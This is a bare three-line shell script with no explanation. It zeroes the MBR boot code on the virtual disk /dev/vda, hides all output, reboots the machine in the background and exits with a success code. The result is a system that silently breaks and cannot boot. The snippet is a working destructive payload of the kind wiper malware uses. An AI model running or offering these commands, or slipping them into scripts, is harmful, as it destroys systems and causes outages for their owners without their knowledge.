dd if=/dev/zero of=/dev/vda bs=446 count=1 &>/dev/null
systemctl reboot &
exit 0
